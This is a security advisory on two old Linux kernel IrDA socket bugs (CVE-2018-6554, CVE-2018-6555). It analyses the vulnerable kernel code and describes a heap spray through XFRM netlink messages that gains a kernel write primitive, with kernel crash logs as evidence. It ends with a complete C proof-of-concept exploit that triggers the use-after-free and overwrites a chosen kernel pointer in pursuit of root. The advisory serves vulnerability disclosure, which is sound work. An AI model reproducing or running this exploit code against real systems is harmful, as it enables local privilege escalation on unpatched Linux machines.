**Vulnerabilities Summary**<br>
The following advisory describes two vulnerabilities in the Linux Kernel. By combining these two vulnerabilities a privilege escalation can be achieved. The two vulnerabilities are quite old and have been around for at least 17 years, quite a few Long Term releases of Linux have them in their kernel. While the assessment of the Linux kernel team is that they only pose a denial of service, that is incorrect, we will provide here proof that they can run code with a bit of effort and some luck (the probability of success of gaining root privileges is above 50%).

**Vendor Response**<br>
“Memory leak in the irda_bind function in net/irda/af_irda.c and later in drivers/staging/irda/net/af_irda.c in the Linux kernel before 4.17 allows local users to cause a denial of service (memory consumption) by repeatedly binding an AF_IRDA socket. (CVE-2018-6554) The irda_setsockopt function in net/irda/af_irda.c and later in drivers/staging/irda/net/af_irda.c in the Linux kernel before 4.17 allows local users to cause a denial of service (ias_object use-after-free and system crash) or possibly have unspecified other impact via an AF_IRDA socket. (CVE-2018-6555)”
https://lists.ubuntu.com/archives/kernel-team/2018-September/095137.html

**CVE**<br>
CVE-2018-6554<br>
CVE-2018-6555<br>

**Credit**<br>
An independent security researcher, Mohamed Ghannam, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
The vulnerability was introduced in 2.4.17 (21 Dec 2001) Affecting all kernel versions up to 4.17 (IrDA subsystem as removed).

**Vulnerability Details**<br>
The first bug affects IRDA socket since its birth in Linux Kernel, it relies to the general queue implementation called “hashbin”.
Bug analysis:
```c
static int irda_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
{
  …
  …
  self->ias_obj = irias_new_object(addr->sir_name, jiffies); (1)
  err = -ENOMEM;
  if (self->ias_obj == NULL)
    goto out;
  err = irda_open_tsap(self, addr->sir_lsap_sel, addr->sir_name); (2)
  if (err < 0) {
    irias_delete_object(self->ias_obj);
    self->ias_obj = NULL;
    goto out;
  }
  …
  irias_insert_object(self->ias_obj); (3)
  …
  return err;
}
```
(1) – self->ias_obj takes the allocated object directly<br>
(2) – in our point of view it checks if the socket is already bound<br>
(3) – if not, insert the allocated object into global hashtable irias_objects, which keeps track of all allocated irias objects
There is a problem in (1), if we call bind() twice, self->ias_obj loses the reference of the first allocated object, so it has no power to free it, and the object will persist in irias_objects hashtable, this allows us of course to exhaust the memory of the system, This will be useful when we combine it with another bug.<br>
Here is another bug :
```c
static int irda_setsockopt(struct socket *sock, int level, int optname,
char __user *optval, unsigned int optlen) {
case IRLMP_IAS_SET:
…
/* Find the object we target.
* If the user gives us an empty string, we use the object
* associated with this socket. This will workaround
* duplicated class name - Jean II */
if(ias_opt->irda_class_name[0] == '\0') {
 if(self->ias_obj == NULL) {
  kfree(ias_opt);
  err = -EINVAL;
  goto out;
 }
 ias_obj = self->ias_obj; (4)
…
 if((!capable(CAP_NET_ADMIN)) &&
    ((ias_obj == NULL) || (ias_obj != self->ias_obj))) {
  kfree(ias_opt);
  err = -EPERM;
  goto out;
 }
…
…
 irias_insert_object(ias_obj); (5)
 kfree(ias_opt);
 break;
```
(4) – the comment made by the developer is self explanatory<br>
(5) – the object is inserted in the queue<br>
The problem here is we can insert the same object again, because this only can be done if a new object is created, or an object already allocated by the user (via setsockopt), and only root can do this, so we can consider it as a security bypass.
Combining these two bugs, we can re-insert an object several times, and free it later, which makes a freed object in irias_objects hash table.
Exploiting this bug requires two things:
1. Reliably spraying the heap to take control of the freed object
2. A target pointer to be overwritten with userdata, this can be achieved by leaking some kernel memory or using global variables.
1.Reliably spraying the heap to take control of the freed object
The freed object is allocated in kmalloc-96, we should search for a good primitive to take control over it:

```c
struct ias_object {
 irda_queue_t q; /* Must be first! */
 magic_t magic;
 char *name;
 int id;
 hashbin_t *attribs;
};
struct irda_queue {
 struct irda_queue *q_next;
 struct irda_queue *q_prev;
 char q_name[NAME_SIZE];
 long q_hash; /* Must be able to cast a (void *) */
};
```

Our target is taking control of q_next and q_prev, which is a good read/write primitive through irias_insert_object() Most of known techniques i.e : sendm(m)sg, msgsnd(), add_key() will not work in our case, sendmsg/msgsnd require a well crafted header, add_key() frees the payload when it finishes and corrupt our payload with a freelist pointer and zeros the payload since this commit : 57070c850a03ee0cea654fc22cb8032fc3139d39)
Luckily, XFRM socket gives us a good primitive to make a consistent spray and controlling the top of our target object, Once we control the freed object, we have a write primitive to any kernel address.
enqueue_first() is responsible for inserting a new object into the queue, since we are controlling the previous queued object, we can write a pointer (with controlled data) to any kernel memory as shown below:

```c
static void enqueue_first(irda_queue_t **queue, irda_queue_t* element)
{
…
} else {
   /*
   * Queue is not empty. Insert element into front of queue.
   */
   element->q_next = (*queue);
   (*queue)->q_prev->q_next = element; <—— here : mov QWORD PTR [rdx],rbx element->q_prev = (*queue)->q_prev;
   (*queue)->q_prev = element;
   (*queue) = element;
 }
}
```

Here is the output:<br>
```assembly
[ 3.899179] BUG: unable to handle kernel paging request at 00000000deadbeef
[ 3.900038] IP: hashbin_insert+0x99/0x150
[ 3.900038] PGD 235eab067
[ 3.900038] PUD 0
[ 3.900038]
[ 3.900038] Oops: 0002 [#1] SMP
[ 3.900038] Modules linked in:
[ 3.900038] CPU: 0 PID: 1036 Comm: xx Not tainted 4.10.0-rc8+ #6
[ 3.900038] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 3.900038] task: ffff880234993ac0 task.stack: ffffc90001694000
[ 3.900038] RIP: 0010:hashbin_insert+0x99/0x150
[ 3.900038] RSP: 0018:ffffc90001697dc0 EFLAGS: 00010082
[ 3.900038] RAX: ffff880235f08318 RBX: ffff880235e73120 RCX: 0000000000000000
[ 3.900038] RDX: 00000000deadbeef RSI: ffff880235585be9 RDI: ffff880235e73131
[ 3.900038] RBP: ffffc90001697df0 R08: ffff88023fc1aaa0 R09: ffff8802349fa680
[ 3.900038] R10: ffff880235fab420 R11: ffff880234993ac0 R12: ffff880235f08300
[ 3.900038] R13: 0000000000000202 R14: 0000000000000003 R15: 0000000000000063
[ 3.900038] FS: 0000000001d30880(0000) GS:ffff88023fc00000(0000) knlGS:0000000000000000
[ 3.900038] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 3.900038] CR2: 00000000deadbeef CR3: 0000000235ea3000 CR4: 00000000000006f0
[ 3.900038] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 3.900038] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 3.900038] Call Trace:
[ 3.900038] irias_insert_object+0x19/0x20
[ 3.900038] irda_bind+0x17a/0x1c0
[ 3.900038] ? security_socket_bind+0x3e/0x60
[ 3.900038] SYSC_bind+0xb0/0xe0
[ 3.900038] ? vfs_write+0x155/0x1b0
[ 3.900038] ? do_nanosleep+0x56/0xf0
[ 3.900038] ? SyS_write+0x41/0xa0
[ 3.900038] SyS_bind+0x9/0x10
[ 3.900038] entry_SYSCALL_64_fastpath+0x13/0x94
[ 3.900038] RIP: 0033:0x44a117
[ 3.900038] RSP: 002b:00007ffdb85d5f58 EFLAGS: 00000287 ORIG_RAX: 0000000000000031
[ 3.900038] RAX: ffffffffffffffda RBX: 00000000006b68d8 RCX: 000000000044a117
[ 3.900038] RDX: 0000000000000024 RSI: 00007ffdb85d5f90 RDI: 0000000000000006
[ 3.900038] RBP: 0000000000000070 R08: 000000000048eb5a R09: 000000000000000c
[ 3.900038] R10: 0000000000000000 R11: 0000000000000287 R12: 00000000006b6880
[ 3.900038] R13: 0000000000000065 R14: 00000000006b68d8 R15: 0000000000000000
[ 3.900038] Code: 8d 7b 10 ba 20 00 00 00 48 89 ce e8 42 bf af ff 49 63 c6 49 8d 04 c4 48 8b 50 10 48 85 d2 74 6e 48 89 13 48 8b 50 10 48 8b 52 08 <48> 89 1a 48 8b 50 10 48 8b 52 08 48 89 53 08 48 8b 50 10 48 89
[ 3.900038] RIP: hashbin_insert+0x99/0x150 RSP: ffffc90001697dc0
[ 3.900038] CR2: 00000000deadbeef
[ 3.900038] ---[ end trace 8a8070c4e016c09c ]---
[ 3.900038] Kernel panic - not syncing: Fatal exception
[ 3.900038] Kernel Offset: disabled
[ 3.900038] Rebooting in 1 seconds..
(gdb) x/i hashbin_insert+0x99
0xffffffff81847839 <hashbin_insert+153>: mov QWORD PTR [rdx],rbx
```

So Here the process of controlling the execution:
* Create 4 socket files via socket()
* bind socket 1 to 3 , this will allocate and insert objects into irias_objects
* bind 1 again , this will trigger the first bug
* insert socket 2 & 3 many times (~5)
* close socket 2, then 3 , this will free sockets and you should see the ias object of socket 3 freed but still queued in the list
* Spray the heap to fill the freed object with our payload, now we have control over obj->q.q_(next/prev)
* bind socket 4 , this is ‘what’ pointer to put in the controlled object (obj->q.q_prev)
* close socket 4 to free the last object
* Spray the heap again to control the object
* Trigger the overwritten pointer , and you’ll get RIP<br>
Here is a crash PoC showing that we’ve overwritten net_sysctl_root.set_ownership<br>
```assembly
./poc 0xffffffff81efeb60
[+] Freeing the first queued ias object
[+] Spray memory and take control of the old freed object
[+] Allocating new object to overwrite the targetted pointer
[+] Freeing object again
[ 8.641924] kernel tried to execute NX-protected page - exploit attempt? (uid: 0)
[ 8.642882] BUG: unable to handle kernel paging request at ffff88023623ad20
[ 8.642882] IP: 0xffff88023623ad20
[ 8.642882] PGD 212b067
[ 8.642882] PUD 212e067
[ 8.642882] PMD 80000002362001e3
[ 8.642882]
[ 8.642882] Oops: 0011 [#1] SMP
[ 8.642882] Modules linked in:
[ 8.642882] CPU: 0 PID: 1038 Comm: xx Not tainted 4.10.0-rc8+ #6
[ 8.642882] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 8.642882] task: ffff88023575de00 task.stack: ffffc90001434000
[ 8.642882] RIP: 0010:0xffff88023623ad20
[ 8.642882] RSP: 0018:ffffc90001437b60 EFLAGS: 00010282
[ 8.642882] RAX: ffff88023623ad20 RBX: ffff880236c2d148 RCX: ffff880236c2d150
[ 8.642882] RDX: ffff880236c2d14c RSI: ffff8802349a0a70 RDI: ffff8802349a0a00
[ 8.642882] RBP: ffffc90001437b88 R08: ffff88023fc1b840 R09: ffff880234b61230
[ 8.642882] R10: 2f2f2f2f2f2f2f2f R11: 0000000000000000 R12: ffff8802349a0a00
[ 8.642882] R13: ffff8802349a0a70 R14: ffffffff81efeb00 R15: 0000000000000004
[ 8.642882] FS: 00000000023d0880(0000) GS:ffff88023fc00000(0000) knlGS:0000000000000000
[ 8.642882] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 8.642882] CR2: ffff88023623ad20 CR3: 0000000235e97000 CR4: 00000000000006f0
[ 8.642882] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 8.642882] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 8.642882] Call Trace:
[ 8.642882] ? proc_sys_make_inode+0xc1/0x100
[ 8.642882] proc_sys_lookup+0xcf/0x140
[ 8.642882] lookup_slow+0x91/0x140
[ 8.642882] walk_component+0x195/0x320
[ 8.642882] ? security_inode_permission+0x3c/0x60
[ 8.642882] link_path_walk+0x18b/0x5c0
[ 8.642882] ? path_init+0x1d4/0x330
[ 8.642882] path_openat+0xe3/0x1320
[ 8.642882] do_filp_open+0x79/0xd0
[ 8.642882] ? do_nanosleep+0x92/0xf0
[ 8.642882] ? kmem_cache_alloc+0x2f/0x150
[ 8.642882] ? getname_flags+0x51/0x1f0
[ 8.642882] do_sys_open+0x116/0x1f0
[ 8.642882] SyS_openat+0xf/0x20
[ 8.642882] entry_SYSCALL_64_fastpath+0x13/0x94
[ 8.642882] RIP: 0033:0x44769e
[ 8.642882] RSP: 002b:00007ffc4d7f1b00 EFLAGS: 00000246 ORIG_RAX: 0000000000000101
[ 8.642882] RAX: ffffffffffffffda RBX: 00000000006d18d8 RCX: 000000000044769e
[ 8.642882] RDX: 0000000000000000 RSI: 00000000004a8a46 RDI: ffffffffffffff9c
[ 8.642882] RBP: 0000000000000070 R08: 0000000000000001 R09: 000000000000000c
[ 8.642882] R10: 0000000000000000 R11: 0000000000000246 R12: 00000000006d1880
[ 8.642882] R13: 0000000000000065 R14: 00000000006d18d8 R15: 0000000000000000
[ 8.642882] Code: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc 00 00 00 00 00 00 00 00 <68> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[ 8.642882] RIP: 0xffff88023623ad20 RSP: ffffc90001437b60
[ 8.642882] CR2: ffff88023623ad20
[ 8.642882] ---[ end trace 531b1224dce05ac9 ]---
[ 8.642882] Kernel panic - not syncing: Fatal exception
[ 8.642882] Kernel Offset: disabled
[ 8.642882] Rebooting in 1 seconds..
```

In order to completely control the execution, we must look for an object holds a pointer to a function pointers, which can be achieved by information leak.
The first “bug” (double bind and losing the reference to ias_obj) is not required to exploit UAF (reinsertion on the same object into the hashbin queue). It has no relevance to the exploitation chain demonstrated in the PoC and UAF can be exploited without it.
Binding the same socket would result in the following path taken (since self->tsap is already set):

```c
err = irda_open_tsap(self, addr->sir_lsap_sel, addr->sir_name);
if (err < 0) {
 irias_delete_object(self->ias_obj);
 self->ias_obj = NULL;
 goto out;
}
```
In the PoC, binding socket 1 twice would simply leave the first allocated object in the queue and set self->ias_obj (for socket 1) to NULL.
The exploitation procedure detailed before in this post is different from the actual PoC:
* Create 4 socket files via socket()
* bind socket 1 to 3 , this will allocate and insert objects into irias_objects
* bind 1 again , this will trigger the first bug
* insert socket 2 & 3 many times (~5)
* close socket 2, then 3 , this will free sockets and you should see the ias object of socket 3 freed but still queued in the list [!]
* Spray the heap to fill the freed object with our payload, now we have control over obj->q.q_(next/prev)
* bind socket 4 , this is ‘what’ pointer to put in the controlled object (obj->q.q_prev)
* close socket 4 to free the last object
* Spray the heap again to control the object
* Trigger the overwritten pointer , and you’ll get RIP<br>

[!] step is different from the PoC which closes sock 3 first and then sock 2. That makes a big difference. Closing sock 2 first would leave a single obj_ias for sock 3 in the queue (links to sock 1 object will be lost). This will not lead to an exploitable UAF case.<br>
Reinserting ias_obj for sock 2 & 3 many times (~5) is not needed. You’re repeating the same operations without affecting the queue layout. To make the whole process clearer here’s the original PoC with comments:

```c
fd1 = socket(0x17,0x5,0);
fd2 = socket(0x17,0x5,0);
fd3 = socket(0x17,0x5,0);
fd4 = socket(0x17,0x5,0);
/* create namespace for xfrm
* this is not required to trigger the bug
*/
create_ns();
irda_bind(fd1,4,0x4a,0x3,"c");
int i;
irda_bind(fd2,4,0x4b,0x3,"c");
irda_bind(fd3,4,0x4c,0x3,"c");
/* at this point there're 3 objects in the queue. refer to fig1 for the queue
* layout*/
irda_bind(fd1,4,0x4a,0x3,"c");
/* binding s1 again reults in self->ias->obj (for s1) being set to NULL.
* However, it does not affect the layout of the queue! */
/* repeated reinsertion of sock 2 and 3 objects 5 times doesn't make any sense.
* These operations are redundant. It's only needed to reinsert 2 and 3 once.
* see fig2 for the queue layout after reinserting ias_obj for sock 2 and fig3
* for after reinserting ias_obj for sock 3. */
for(i=0;i<5;i++) {
/* 0x00 means that it takes self->ias_obj */
irda_set_ias(fd2,"\x00");
irda_set_ias(fd3,"\x00");
}
/* Again, closing sock 1 has no effect on the queue layout. The reference to
* the sock 1 object is lost because of the double bind earlier */
close(fd1);
/* Trace dequeue_general() and you should get the queue layout in fig4 */
close(fd3);
/* annoying the queue and free the first queued object*/
printf("[+] Freeing the first queued ias object \n");
/* THIS IS WHERE THE FIRST UAF HAPPENS. You're overwriting the q_prev ptr in
* the freed sock 3 object with the address of the sock 1 object. Trace
* dequeue_general() again */
close(fd2);
//getchar();
sleep(1);
/* By the time you start the spray, the q_prev ptr in the sock 3 object is
* already overwritten. In some cases you get lucky and there's no object
* allocated where sock 3 object was, so you're overwriting bytes 8 to 16 of
* some unallocated object. If this was q_next for example, then you'd be
* overwriting the freelist ptr and corrupting the slab.
* Note that when you get "unlucky" and some object is already allocated at the
* sock 3 object address, you're overwriting bytes 8 to 16 of that object with
* address of sock 1 obj.
*/
/* If the target object is still not allocated at this point, the spray would
* reset q_prev value to the target address (e.g., 0xdeadbeef in the example).
*/
unsigned char *buf = malloc(4096);
pid_t pid;
u_int64_t addr = 0xffffffff81f01500;
addr = 0xffffffff81efeb60;
//addr = 0xdeadbeef;
addr = target_addr;
void *x = &addr;
memset(buf,0xcc,88);
*(void **)(buf+8) = (void*)addr;
printf("[+] Spray memory and take control of the old freed object\n");
spray_heap(buf,88,200);
usleep(10000);
printf("[+] Allocating new object to overwrite the targetted pointer\n");
/* Now inserting sock 4 obj would trigger your first oops message on
* dereferencing q_prev (0xdeadbeef) on the enqueue_first() path
* (*queue)->q_prev->q_next = element
*
* where queue head is pointing to the sprayed object.
*
* The rest is not relevant.
*/
irda_bind(fd4,4,0x30,0x3,"c");
printf("[+] Freeing object again \n");
close(fd4);
sleep(1);
printf("[+] Fill the last object with payload \n");
memset(buf,0xcc,88);
spray_heap(buf,88,200);
usleep(1000);
```

Here is a crash PoC showing that we’ve overwritten net_sysctl_root.set_ownership” doesn’t make sense based on the produced oops message showing that there was an attempt to execute NX memory address. What this oops message shows is that you’ve overwritten some function ptr (mostly due to luck) with address of the new ias_object (when binding) and then tried to execute that pointer in the original path.

**Exploit**<br>
```c
#define _GNU_SOURCE
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <linux/irda.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#define NLA_LENGTH(len)					\
        (NLA_ALIGN(sizeof(struct nlattr)) + (len))
#define NLMSG_TAIL(nmsg)						\
        ((struct nlattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
#define NLA_DATA(nla)					\
        ((void*)(((char*)(nla)) + NLA_LENGTH(0)))
char *saddr = "1111111122222222";
char *daddr = "3333333344444444";
struct sockaddr_nl addr;
struct req_newae {
	struct nlmsghdr n;
	struct xfrm_aevent_id id;
	char buf[2048];
};
struct req_newsa {
	struct nlmsghdr n;
	struct xfrm_usersa_info xsinfo;
	char buf[2048];
};
void create_ns(void)
{
	if(unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}
}
int create_netlink_socket()
{
	int fd,err;
	fd = socket(AF_NETLINK,SOCK_RAW,NETLINK_XFRM);
	if( fd < 0) {
		perror("socket");
		return -1;
	}
	memset(&addr,0,sizeof(struct sockaddr_nl));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = 0; /* packet goes into the kernel */
	addr.nl_groups = XFRMNLGRP_NONE; /* no need for multicast group */
	return fd;
}
int send_msg(int fd,struct nlmsghdr *msg)
{
	int err;
	err = sendto(fd,(void *)msg,msg->nlmsg_len,0,(struct sockaddr*)&addr,
		     sizeof(struct sockaddr_nl));
	if (err < 0) {
		perror("sendto");
		return -1;
	}
	return 0;
}
int add_attr(struct nlmsghdr *n,int maxlen,int type,const void *data,int attrlen)
{
	struct nlattr *nl;
	int len = NLA_LENGTH(attrlen);
	nl = NLMSG_TAIL(n);
	nl->nla_type = type;
	nl->nla_len = len;
	memcpy(NLA_DATA(nl),data,attrlen);
	n->nlmsg_len =NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(len);
	return 0;
}
struct req_newsa *build_sa_frame(unsigned char *payload,u_int32_t size)
{
	struct req_newsa *r;
	in_addr_t src,dst;
	struct xfrm_mark mark = {0x0,0x0};
	struct xfrm_algo *algo;
	struct xfrm_replay_state_esn *esn;
	size_t esn_size;
	r = malloc(sizeof(struct req_newsa));
	if (!r) {
		perror("malloc");
		return NULL;
	}
	r->n.nlmsg_type = XFRM_MSG_NEWSA;
	r->n.nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL;
	r->n.nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
	r->xsinfo.lft.soft_byte_limit = XFRM_INF;
	r->xsinfo.lft.hard_byte_limit = XFRM_INF;
	r->xsinfo.lft.soft_packet_limit = XFRM_INF;
	r->xsinfo.lft.hard_packet_limit = XFRM_INF;
	r->xsinfo.mode = XFRM_MODE_TUNNEL;
	r->xsinfo.flags = XFRM_STATE_ESN;
	src = inet_addr(saddr);
	dst = inet_addr(daddr);
	r->xsinfo.family = AF_INET6;
	//r->xsinfo.saddr.a4 = src;
	//r->xsinfo.id.daddr.a4 = dst;
	memcpy((char*)r->xsinfo.saddr.a6,saddr,16);
	memcpy((char*)r->xsinfo.id.daddr.a6,daddr,16);
	r->xsinfo.id.proto = IPPROTO_AH;
	r->xsinfo.id.spi = 12345;
	add_attr(&r->n,sizeof(r->buf),XFRMA_MARK,&mark,sizeof(mark));
	algo = malloc(sizeof(struct xfrm_algo)+32+1);
	if(!algo) {
		perror("algo allocation");
		return NULL;
	}
	memset(algo->alg_name,0,sizeof(algo->alg_name));
	strcpy(algo->alg_name,"hmac(sha256)");
	algo->alg_key_len = 0xcc;
	strncpy(algo->alg_key,"12345678901234567890123456789012",32);
	add_attr(&r->n,sizeof(r->buf),XFRMA_ALG_AUTH,algo,sizeof(struct xfrm_algo)+33);
	/* build ens */
	esn_size = sizeof(struct xfrm_replay_state_esn) + 1024;
	esn = (struct xfrm_replay_state_esn *)payload;
	/* This is mandatory, in order to let the kernel parse the nlattr structure
	 * if we want to use a specific memory location, we must allocate a memory
	 * with size=target address , which is a 32-bit value
	 */
	esn->bmp_len = (size - sizeof(struct xfrm_replay_state_esn))/4;
	add_attr(&r->n,sizeof(r->buf),XFRMA_REPLAY_ESN_VAL,esn,esn_size);
	return r;
}
void trigger() {
	open("/proc/sys/net/core/somaxconn",O_RDONLY);
	printf("See crash ? \n");
}
void spray_heap(u_int8_t *payload,u_int32_t size,int iter)
{
	int fd,err;
	struct req_newae *r;
	struct req_newsa *sa;
	int i,j;
#define SOCKFD 1000
	int fds[SOCKFD];
	/* don't make iter >= 1000, or change SOCKFD
	   to a greated value */
	sa = build_sa_frame(payload,size);
	for(i=0;i<iter;i++) {
		fd = create_netlink_socket();
		//printf("send %d\n",i);
		send_msg(fd,&sa->n);
		fds[i] = fd;
		/* don't close fds */
		//free(sa); /* don't need to do this*/
		usleep(1000);
	}
	//free(sa);
}
int irda_set_ias(int fd,char *name)
{
	struct irda_ias_set set;
	int err = 0;
	memset(&set,0,sizeof(set));
	strncpy(set.irda_class_name,name,64);
	memset(&set.irda_attrib_name,'C',255);
	set.irda_attrib_type = 2;
	set.attribute.irda_attrib_octet_seq.len = 8;
	memset(&set.attribute.irda_attrib_octet_seq.octet_seq,0x41,1023);
	set.daddr = 4;
	err = setsockopt(fd,0x10a,0x2,&set,sizeof(set));
	//printf("setsockopt(SET) fd=%d  err=%d\n",fd,err);
	return err;
}
int irda_bind(int fd,u_int16_t  family,u_int8_t lsap_sel,int sir_addr,char *name)
{
	struct sockaddr_irda sa,sa1;
	int err;
	memset(&sa,0,sizeof(sa));
	sa.sir_family =family;
	sa.sir_lsap_sel = lsap_sel;
	sa.sir_addr = sir_addr;
	memcpy(&sa.sir_name,name,25);
	err = bind(fd,(struct sockaddr*)&sa,sizeof(sa));
	//printf("bind fd=%d err=%d\n",fd,err);
	return err;
}
void uaf(unsigned long target_addr)
{
	int fd1,fd2,fd3,fd4;
	struct sockaddr_irda sa,sa1;
	struct irda_ias_set set;
	int err = 0;
	pthread_t tid[1024];
	memset(&set,0,sizeof(set));
	fd1 = socket(0x17,0x5,0);
	fd2 = socket(0x17,0x5,0);
	fd3 = socket(0x17,0x5,0);
	fd4 = socket(0x17,0x5,0);
	/* create namespace for xfrm
	 * this is not required to trigger the bug
	 */
	create_ns();
	irda_bind(fd1,4,0x4a,0x3,"c");
	int i;
	irda_bind(fd2,4,0x4b,0x3,"c");
	irda_bind(fd3,4,0x4c,0x3,"c");
	irda_bind(fd1,4,0x4a,0x3,"c");
	for(i=0;i<5;i++) {
		/* 0x00 means that it takes self->ias_obj */
		irda_set_ias(fd2,"\x00");
		irda_set_ias(fd3,"\x00");
	}
	close(fd1);
	close(fd3);
	/* annoying the queue and free the first queued object*/
	printf("[+] Freeing the first queued ias object \n");
	close(fd2);
	//getchar();
	sleep(1);
	unsigned char *buf = malloc(4096);
	pid_t pid;
	u_int64_t addr = 0xffffffff81f01500;
	addr = 0xffffffff81efeb60;
	//addr = 0xdeadbeef;
	addr = target_addr;
	void *x = &addr;
	memset(buf,0xcc,88);
	*(void **)(buf+8) = (void*)addr;
	printf("[+] Spray memory and take control of the old freed object\n");
	spray_heap(buf,88,200);
	usleep(10000);
	printf("[+] Allocating new object to overwrite the targetted pointer\n");
	irda_bind(fd4,4,0x30,0x3,"c");
	printf("[+] Freeing object again \n");
	close(fd4);
	sleep(1);
	printf("[+] Fill the last object with payload \n");
	memset(buf,0xcc,88);
	spray_heap(buf,88,200);
	usleep(1000);
}
int main(int argc,char **argv)
{
	unsigned long target_addr;
	pid_t pid;
	if(argc != 2) {
		printf("%s <target object>\n",*argv);
		return -1;
	}
	sscanf(argv[1],"%lx",&target_addr);
	uaf(target_addr);
	trigger();
}
```
